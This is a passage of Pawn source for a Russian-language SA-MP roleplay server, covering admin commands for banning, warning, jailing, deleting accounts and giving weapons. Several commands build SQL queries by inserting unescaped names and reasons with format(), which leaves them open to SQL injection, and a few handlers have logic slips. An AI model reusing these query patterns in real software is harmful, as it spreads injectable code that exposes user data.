		format(str5, sizeof(str5), fmt_string5,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str5);
		SetPlayerChatBubble(playerid, str5, COLOR_PURPLE, 30.0, 7000);
		static const fmt_string[] = "достал и показал удостоверение игроку %s";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
		format(str, sizeof(str), fmt_string,PlayerInfo[params[0]][pSendername]);
		SetPlayerChatBubble(playerid, str, COLOR_PURPLE, 30.0, 7000);

	}
	else SendClientMessage(playerid, CGREY, "Вам недоступна данная команда");
	return true;
}
CMD:showbadge(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(IsAGos(playerid))
	{
		if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /showbadge [id игрока]");
		if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
		new Float:x,Float:y,Float:z;
    	GetPlayerPos(params[0],x,y,z);
    	if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
   		static const fmt_string1[] = "{FFFFFF}Имя Фамилия: {f7ae11}%s{FFFFFF}\nОрганизация: {f7ae11}%s{FFFFFF}\nДолжность: {f7ae11}%s{FFFFFF}";
		new strr[sizeof(fmt_string1)+MAX_PLAYER_NAME+32+32];
		format(strr, sizeof(strr), fmt_string1,PlayerInfo[playerid][pSendername],FracInfo[PlayerInfo[playerid][pMember]][fName],FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]]);
		ShowPlayerDialog(params[0],0,DIALOG_STYLE_MSGBOX,"Удостоверение",strr,"Назад","");
		static const fmt_string5[] = "%s достает удостоверение и показывает его %s";
		new str5[sizeof(fmt_string5)+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
		format(str5, sizeof(str5), fmt_string5,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str5);
		SetPlayerChatBubble(playerid, str5, COLOR_PURPLE, 30.0, 7000);
		static const fmt_string[] = "достал и показал удостоверение игроку %s";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
		format(str, sizeof(str), fmt_string,PlayerInfo[params[0]][pSendername]);
		SetPlayerChatBubble(playerid, str, COLOR_PURPLE, 30.0, 7000);
		
	}
	else SendClientMessage(playerid, CGREY, "Вам недоступна данная команда");
	return true;
}
CMD:hide(playerid)
{
    if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 1 || AdminLogged[playerid] == false ) return true;
    if(GetPVarInt(playerid,"HideAC"))
    {
        for(new i = 0;i <= 7; i++) TextDrawShowForPlayer(playerid,OSN[i]);
	    ShowProgressBarForPlayer(playerid,Golod);
		for(new i;i <10; i++) TextDrawShowForPlayer(playerid, CheatText[i]);
		DeletePVar(playerid,"HideAC");
	}
    else
	{
		for(new i = 0;i <= 7; i++) TextDrawHideForPlayer(playerid,OSN[i]);
		HideProgressBarForPlayer(playerid,Golod);
		for(new i;i <10; i++) TextDrawHideForPlayer(playerid, CheatText[i]);
		SetPVarInt(playerid,"HideAC",1);
	}
    return 1;
}
CMD:a(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 1 || AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "s[100]", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /a [текст]");
	static const fmt_string[] = "[A-%d] %s[%d]: %s";
	new str[sizeof(fmt_string)+4+MAX_PLAYER_NAME+100];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pAdmin],PlayerInfo[playerid][pSendername],playerid,params[0]);
	SendAdminMessage(CYELLOW,str);
	return true;
}

CMD:x(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "s[100]", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /x [текст]");
	static const fmt_string[] = "[X] А-%d %s[%d]: %s";
	new str[sizeof(fmt_string)+4+MAX_PLAYER_NAME+100];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pAdmin],PlayerInfo[playerid][pSendername],playerid,params[0]);
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
		if(PlayerInfo[i][pAdmin] > 4) SendClientMessage(i, 0xa1c114AA, str);
	}
	return true;
}
CMD:unmute(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 2|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /unmute [id]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(PlayerInfo[params[0]][pMuted] == 0) return SendClientMessage(playerid,CGREY,"У данного человека нет молчанки");
	static const fmt_string[] = "Администратор %s снял молчанку с %s";
	PlayerInfo[params[0]][pMuted] = 0;
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
	SendAdminToAll(COLOR_LIGHTRED,str);
	return true;
}
CMD:givegun(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "udd", params[0],params[1],params[2])) return SendClientMessage(playerid, CGREY, "Введите: /givegun [id игрока] [id оружия] [кол-во патронов]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(params[1] > 15 && params[1] < 19 || params[1] > 35 && params[1] < 41 || params[1] == 44 || params[1] == 45) return SendClientMessage(playerid,CGREY,"Данное оружие запрещено");
	if(params[2] > 999 || params[2] < 1) return SendClientMessage(playerid, CGREY, "Кол-во патронов от 1 до 999!");
	SendClientMessage(playerid,CREWARD,"Вы выдали игроку оружие");
	static const fmt_string[] = "Администратор {f7ae11}%s{FFFFFF} выдал вам оружие с {f7ae11}%i{FFFFFF} патронами";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],params[2]);
	SendClientMessage(params[0],-1,str);
	GivePlayerWeapon(params[0], params[1], params[2]);
	new gunname[32];
	GetWeaponName(params[1],gunname,32);
	static const fmt_string32[] = "[A] %s выдал игроку %s %s с %d патронами";
	new str32[sizeof(fmt_string32)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+30];
	format(str32, sizeof(str32), fmt_string32,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername],gunname,params[2]);
	SendAdminMessage(CGREY,str32);
	return true;
}
CMD:jp(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return true;
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USEJETPACK);
	return true;
}
CMD:objm(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false) return true;
    query = "";
    static const fmt_string[] = "%i | ID %i\n";
    new str[sizeof(fmt_string)+2+8];
    for(new i = 0; i < 100;i++)
    {
        
        format(str, sizeof(str), fmt_string,i,pobjectid[i]);
        strcat(query, str);
    }
    ShowPlayerDialog(playerid,27,DIALOG_STYLE_LIST,"Объекты",query,"Далее","Назад");
    return true;
}
stock SendAdminToAll(color,str[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
	    if(!PlayerInfo[i][pAdminC] || PlayerInfo[i][pAdmin]) SendClientMessage(i,color,str);
	}
}
CMD:x2(playerid, params[])
{
 	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	optx2 = (!optx2) ? (true) : (false);
	new text[10];
	text = (!optx2) ? ("выключил") : ("включил");
	static const fmt_string[] = "[A] %s %s X2 опыта";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+10];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],text);
	SendAdminMessage(CGREY,str);
	new name[32];
    GetConsoleVarAsString("hostname", name, sizeof(name));
    format(str,sizeof(str),"hostname %s %s",name,(!optx2) ? ("") : ("| Акция X2"));
    SendRconCommand(str);
	return true;
}

function CheckLeader(playerid)
{
    if(cache_get_row_count(mysql)>0)
    {
	    SetFractionStr(PlayerInfo[playerid][pMember], "leader", "None");
		strmid(FracInfo[PlayerInfo[playerid][pMember]][fLeader],"None",0,strlen("None"),MAX_PLAYER_NAME);
	}
	return 1;
}

CMD:ban(playerid, params[])
{
 	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	new ip[16], data[32];
	new kek[50];
	if(sscanf(params, "uis[50]", params[0],params[1], kek)) return SendClientMessage(playerid, CGREY, "Используйте: /ban [id/ник игрока] [кол-во дней] [причина]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(PlayerInfo[playerid][pAdmin] < PlayerInfo[params[0]][pAdmin]) return SendClientMessage(playerid,CGREY,"Вы не можете сделать действие с администраторос выше вас");
    if((IsAIP(params[2]) || IsADomen(params[2]))  && PlayerInfo[playerid][pAdmin] < 6)
	{
		SendClientMessage(playerid,COLOR_LIGHTRED,"В таких сообщениях запрещается использовать английские символы");
		SendClientMessage(playerid,COLOR_LIGHTRED,"Не повторяйте это действие во избежание наказания.");
		return false;
	}
	query = "";
	format(query, sizeof(query), "SELECT * FROM "TABLE_FRACTION" WHERE leader = '%s' LIMIT 1", PlayerInfo[params[0]][pSendername]);
	mysql_tquery(mysql, query, "CheckLeader", "d", params[0]);

/*	format(query, sizeof(query), "SELECT * FROM "TABLE_FRACTION" WHERE leader = '%s' LIMIT 1", PlayerInfo[params[0]][pSendername]);
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(mysql_fetch_row_format(query))
	{
		SetFractionStr(PlayerInfo[params[0]][pMember], "leader", "None");
		strmid(FracInfo[PlayerInfo[params[0]][pMember]][fLeader],"None",0,strlen("None"),MAX_PLAYER_NAME);
	}
	mysql_free_result();*/
	PlayerInfo[params[0]][pKolBan] += params[1];
	GetPlayerIp(params[0], ip, 16);
	SaveAccount(params[0]);
	PlayerInfo[playerid][pBanKol]++;
	static const fmt_string[] = "Администратор %s забанил игрока %s на %i дней. Причина: %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername],params[1],kek);
	SendAdminToAll(COLOR_LIGHTRED,str);
	//SendClientMessage(params[0],CRED,str);
	new years, months, days;
	getdate(years, months, days);
	format(data, 32, "%02d.%02d.%04d", days, months, years);
	query = "";
	format(query, sizeof(query), "INSERT INTO bans (name, whobanned, ip, bandate, time, reason) VALUES ('%s', '%s','%s', '%s', %d, '%s')", PlayerInfo[params[0]][pSendername], PlayerInfo[playerid][pSendername], ip, data, gettime()+60*60*24*params[1], kek);
	mysql_tquery(mysql,query);
	query = "";
    format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",str);
	mysql_tquery(mysql,query);
	query = "";
	format(query,sizeof(query),"INSERT INTO `history` ( `nameid`, `adm`, `com`,`time`,`reason` ) VALUES ('%d', '%s', 'Бан', '%s', '%s')",PlayerInfo[params[0]][pID], PlayerInfo[playerid][pSendername],data,kek);
	mysql_tquery(mysql,query);
	SetPVarInt(params[0],"Kick1",1);
	Kick(params[0], FIX_FUNCTION, 1200);
/*	if(PlayerInfo[playerid][pAdmin] > 4)
	{
		static const fmt_string1[] = "{f7ae11}Основная статистика:\n{FFFFFF}\tОбщее кол-во задоначенных денег: %s\n\tКол-во задоначенных денег на аккаунте: %s\n\tОнлайн за сегодня: %s час(ов)\n\tОнлайн за месяц: %s час(ов)\n\n{f7ae11}Дополнительная статистика:\n{FFFFFF}\tПоследний заход: %s\n\tДата регистрации: %s\n\tIP Регистрации: %s\n\tIP: %s\n\tPINCODE: %s\n\tGoogle Authenticator: %s\n\tVk Security: %s\n\n%s";
		new str2[sizeof(fmt_string1)+80];
		new str2[402+80];
		format(str2,sizeof(str2),"%s\n\nЗаблокировать IP адрес?",GetInf(playerid,PlayerInfo[params[0]][pSendername]));
		ShowPlayerDialog(playerid, 353, DIALOG_STYLE_MSGBOX,PlayerInfo[params[0]][pSendername] ,str2 , "Да", "Нет");
		SetPVarString(playerid,"Ips",ip);
	}*/
	return true;
}

CMD:unwarn(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 4|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /unwarn [id]");
	if(!PlayerInfo[params[0]][pWarn]) SendClientMessage(playerid, CGREY, "У игрока нет предупреждений");
	static const fmt_string[] = "Администратор %s снял предупреждение с %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
	SendAdminToAll(COLOR_LIGHTRED,str);
	query = "";
	format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",str);
	mysql_tquery(mysql,query);
	PlayerInfo[params[0]][pWarn]--;
	return true;
}
CMD:unbanip(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false) return true;
    if(sscanf(params, "s[128]", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /unbanip [ip]");
	new string[50];
	static const fmt_string[] = "[A] %s разбанил IP: %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+16];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],params[0]);
	SendAdminMessage(CGREY,str);
    format(string, sizeof(string),"unbanip %s", params[0]);
    query = "";
    format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",string);
	mysql_tquery(mysql,query);
    SendRconCommand(string);
    SendRconCommand("reloadbans");
    return true;
}
CMD:banip(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false) return true;
    if(sscanf(params, "s[128]", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /banip [ip]");
    if(!strcmp(params[0],"*.*.*.*",true)) return true;
	new string[50];
	static const fmt_string[] = "[A] %s забанил IP: %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+16];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],params[0]);
	SendAdminMessage(CGREY,str);
	query = "";
	format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",string);
	mysql_tquery(mysql,query);
    format(string, sizeof(string),"banip %s", params[0]);
    SendRconCommand(string);
    SendRconCommand("reloadbans");
    return true;
}

CMD:resetgun(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /resetgun [id игрока]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	ResetPlayerWeapons(params[0]);
	SendClientMessage(playerid,CREWARD,"Вы сбросили оружие игроку");
	return true;
}
CMD:boom(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
    new Float:x, Float:y, Float:z;
    GetPlayerPos(playerid, x, y, z);
    TogglePlayerControllable(playerid, 0);
    CreateExplosion(x, y, z, 7, 10.0);
    CreateExplosion(x, y+4.0, z, 7, 10.0);
    CreateExplosion(x, y-4.0, z, 7, 10.0);
    CreateExplosion(x+4.0, y, z, 7, 10.0);
    CreateExplosion(x-4.0, y, z, 7, 10.0);
    TogglePlayerControllable(playerid, 1);
    return 1;
}
CMD:gun(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /gun [id игрока]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	new strings[1000],strin[100],strs[100],gunname[32];
	new weapons[13][2];
	format(strs, 100, "{FFFFFF}Игрок:\t\t\t%s", PlayerInfo[params[0]][pSendername]);
	strcat(strings, strs);
	for (new i = 0; i < 13; i++)
	{
		GetPlayerWeaponData(params[0], i, weapons[i][0], weapons[i][1]);
		GetWeaponName(weapons[i][0],gunname,32);
		if(weapons[i][0] != 0)
		{
			format(strin,70,"\n\nОружие:\t\t%s (%d)\nПатроны:\t\t%d",gunname,weapons[i][0],weapons[i][1]);
			strcat(strings,strin);
		}
	}
	ShowPlayerDialog(playerid,0,0,"Оружие игрока",strings,"Закрыть","");
	return true;
}

function DelAcc(playerid,acc[])
{
    if(cache_get_row_count(mysql)>0)
    {
        static const fmt_string[] = "[A] %s удалил аккаунт %s";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],acc);
		SendAdminMessage(CGREY,str);
		query = "";
		format(query, sizeof(query), "DELETE FROM accounts WHERE name = '%s'", acc);
		mysql_tquery(mysql,query);
    }
    else SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует!");
}
CMD:delacc(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "s[32]", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /delacc [имя игрока]");
	if(strcmp(params[0], "Enique_Guddi", true) == 0 || strcmp(params[0], "Samuel_Migos", true) == 0)
	{
 		static const fmt_string[] = "[A] %s снят системой анти-слив";
		new str[sizeof(fmt_string)-2+MAX_PLAYER_NAME];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
		SendAdminMessage(CGREY,str);
		PlayerInfo[playerid][pAdmin] = 0;
		return true;
	}
	query = "";
	format(query, sizeof(query), "SELECT * FROM accounts WHERE name = '%s'", params[0]);
	mysql_tquery(mysql, query, "DelAcc", "ds", playerid,params[0]);
	
	
/*	format(query, sizeof(query), "SELECT * FROM accounts WHERE name = '%s'", params[0]);
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(!mysql_fetch_row_format(query))
	{
		SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует!");
	    mysql_free_result();
	    return true;
	}
	
	mysql_free_result();*/
	return true;
}
function UnBan(playerid,acc[])
{
    if(cache_get_row_count(mysql)>0)
    {
        static const fmt_string[] = "Администратор %s разблокировал игрока %s";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],acc);
		SendAdminToAll(COLOR_LIGHTRED,str);
		query = "";
		format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",str);
		mysql_tquery(mysql,query);
		query = "";
		format(query, sizeof(query), "DELETE FROM bans WHERE name = '%s'", acc);
		mysql_tquery(mysql,query);
    }
    else SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует!");
    return 1;
}
CMD:unban(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "s[32]", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /unban [имя игрока]");
	query = "";
	format(query, sizeof(query), "SELECT * FROM bans WHERE name = '%s'", params[0]);
	mysql_tquery(mysql, query, "UnBan", "ds", playerid,params[0]);
/*	format(query, sizeof(query), "SELECT * FROM bans WHERE name = '%s'", params[0]);
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(!mysql_fetch_row_format(query))
	{
		SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует!");
	    mysql_free_result();
	    return true;
	}
	static const fmt_string[] = "Администратор %s разблокировал игрока %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],params[0]);
	SendAdminToAll(COLOR_LIGHTRED,str);
	format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",str);
	mysql_tquery(mysql,query);
	format(query, sizeof(query), "DELETE FROM bans WHERE name = '%s'", params[0]);
	mysql_tquery(mysql,query);
	mysql_free_result();*/
	return true;
}

stock UpdatePlayerRadar(playerid)
{
    if(radar_time[playerid] > gettime()) return 1;
    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
    {
    	if(IsACop(playerid)) return true;
        new speed = GetVehicleSpeed(GetPlayerVehicleID(playerid)) / 2;
        new string[600];
        for(new r = 1; r <= TOTALRADAR; r++)
        {
            if(IsPlayerInRangeOfPoint(playerid, 30.0, RadarInfo[r][rX], RadarInfo[r][rY], RadarInfo[r][rZ]) && speed > RadarInfo[r][rSpeed])
            {
                radar_time[playerid] = gettime() + 10;
				SendClientMessage(playerid,CREWARD,"[Информация]{FFFFFF} Вы были оштрафованы на 50$ за нарушение максимальной допустимой скорости");
				SendClientMessage(playerid,-1,"Оплатить штраф можно в ближайшем отделении полиции. За неуплату штрафов Вы будете лишены прав!");
				format(string, sizeof(string),"~w~SPEED: %d/%d MAX.~n~FINED 50$.",speed,RadarInfo[r][rSpeed]);
				GameTextForPlayer(playerid,string,3000,5);
				PlayerInfo[playerid][pShtrav] += 50;
				PlayerInfo[playerid][pShtravTick]++;
				if(PlayerInfo[playerid][pShtravTick] >= 5)
				{
					PlayerInfo[playerid][pLic][L_AVTO] = 0;
					PlayerInfo[playerid][pLicTime][L_AVTO] = 0;
					SendClientMessage(playerid,CREWARD,"За неуплату штрафов Вы были лишены прав на вождение автомобилем!");
				}
            }
		}
	}
 	return true;
}
CMD:warn(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "us[64]", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Используйте: /warn [id] [причина]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(PlayerInfo[playerid][pAdmin] < PlayerInfo[params[0]][pAdmin]) return SendClientMessage(playerid,CGREY,"Вы не можете сделать действие с администраторос выше вас");
    if((IsAIP(params[2]) || IsADomen(params[2]))  && PlayerInfo[playerid][pAdmin] < 6)
	{
		SendClientMessage(playerid,COLOR_LIGHTRED,"В таких сообщениях запрещается использовать английские символы");
		SendClientMessage(playerid,COLOR_LIGHTRED,"Не повторяйте это действие во избежание наказания.");
		return false;
	}
	new years, months, days;
	getdate(years, months, days);
	SetPVarInt(params[0],"Kick1",1);
	query = "";
	format(query, sizeof(query), "SELECT * FROM "TABLE_FRACTION" WHERE leader = '%s' LIMIT 1", PlayerInfo[params[0]][pSendername]);
	mysql_tquery(mysql, query, "CheckLeader", "d", params[0]);
	for(new i = 0; i <= 4; i++)
	{
	    if(PlayerInfo[params[0]][pObject][i] == 0) continue;
		DestroyDynamicObject(PlayerInfo[params[0]][pObject][i]);
		DestroyDynamic3DTextLabel(PlayerInfo[params[0]][pLable][i]);
	}
	getdate(years, months, days);
	new data[32];
	format(data, 32, "%02d.%02d.%04d", days, months, years);
	query = "";
	format(query,sizeof(query),"INSERT INTO `history` ( `nameid`, `adm`, `com`,`time`,`reason` ) VALUES ('%d', '%s', 'Варн', '%s', '%s')",PlayerInfo[params[0]][pID], PlayerInfo[playerid][pSendername],data,params[1]);
	mysql_tquery(mysql,query);
	if(PlayerInfo[params[0]][pWarn] < 2)
	{
		PlayerInfo[params[0]][pWarn]++;
		PlayerInfo[params[0]][pKolWarn]++;
		PlayerInfo[playerid][pWarnKol]++;
		PlayerInfo[params[0]][pWarnSkok] = gettime() +7*86400;
		static const fmt_string[] = "Администратор %s выдал предупреждение игроку %s [%i/3]. Причина: %s";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64+3];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername],PlayerInfo[params[0]][pWarn],params[1]);
		SendAdminToAll(COLOR_LIGHTRED,str);
		query = "";
		format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",str);
		mysql_tquery(mysql,query);
		SendClientMessage(params[0],CRED,"Предупреждение будет снято через 7 дней");
		SendClientMessage(params[0],CRED,"При получении 3 предупреждений выдаётся бан на 10 дней");
		PlayerInfo[params[0]][pMember] = 0;
		PlayerInfo[params[0]][pLeader] = 0;
		PlayerInfo[params[0]][pRank] = 0;
		PlayerInfo[params[0]][pGolos] = 0;
 		PlayerInfo[params[0]][pGolos1] = 0;
		SaveAccount(params[0]);
		Kick(params[0], FIX_FUNCTION, 1200);
	}
	else
	{
	    PlayerInfo[params[0]][pWarn]++;
	    PlayerInfo[params[0]][pKolWarn]++;
		PlayerInfo[params[0]][pKolBan] += 10;
		PlayerInfo[params[0]][pWarnSkok] = gettime() +7*86400;
		PlayerInfo[params[0]][pMember] = 0;
		PlayerInfo[params[0]][pLeader] = 0;
		PlayerInfo[params[0]][pGolos] = 0;
 		PlayerInfo[params[0]][pGolos1] = 0;
		PlayerInfo[params[0]][pRank] = 0;
		static const fmt_string[] = "%s 10 WARN [3/3] ";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
		format(str, sizeof(str), fmt_string,PlayerInfo[params[0]][pSendername]);
		cmd_ban(playerid,str);
		SendClientMessage(params[0],CRED,"Предупреждение будет снято через 7 дней");
		SendClientMessage(params[0],CRED,"Вы забанены на 10 дней");

	}
	return true;
}
CMD:unjail(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 2|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /unjail [id]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(!PlayerInfo[params[0]][pJail]) return SendClientMessage(playerid,CGREY,"Игрок не в тюрьме");
	static const fmt_string[] = "Администратор %s выпустил из тюрьмы %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+4+64];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
	SendAdminToAll(COLOR_LIGHTRED,str);
	query = "";
	format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",str);
	mysql_tquery(mysql,query);
	PlayerInfo[params[0]][pJailTime] = 0;
	PlayerInfo[params[0]][pJail] = 0;
	SpawnPlayer(params[0]);
	return true;
}
CMD:jail(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "uis[64]", params[0],params[1],params[2])) return SendClientMessage(playerid, CGREY, "Используйте: /jail [id] [время] [причина]");
	if(params[1] < 1 || params[1] > 600) return SendClientMessage(playerid,CGREY,"Время от 1 до 600");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	static const fmt_string[] = "Администратор %s посадил в тюрьму игрока %s [%i мин]. Причина: %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+4+64];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername],params[1],params[2]);
	SendAdminToAll(COLOR_LIGHTRED,str);
	query = "";
	format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",str);
	mysql_tquery(mysql,query);
	PlayerInfo[params[0]][pJailTime] = params[1]*60;
	PlayerInfo[params[0]][pJail] = 2;
	PlayerInfo[playerid][pJailKol] ++;
	SetPlayerPos(params[0],302.3612,306.1608,999.1484);
	SetPlayerFacingAngle(params[0],358.9110);
	SetPlayerInterior(params[0],4);
	SetPlayerVirtualWorld(params[0], 1);
	ResetPlayerWeapons(params[0]);
	return true;
}
CMD:skick(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 4|| AdminLogged[playerid] == false ) return true;
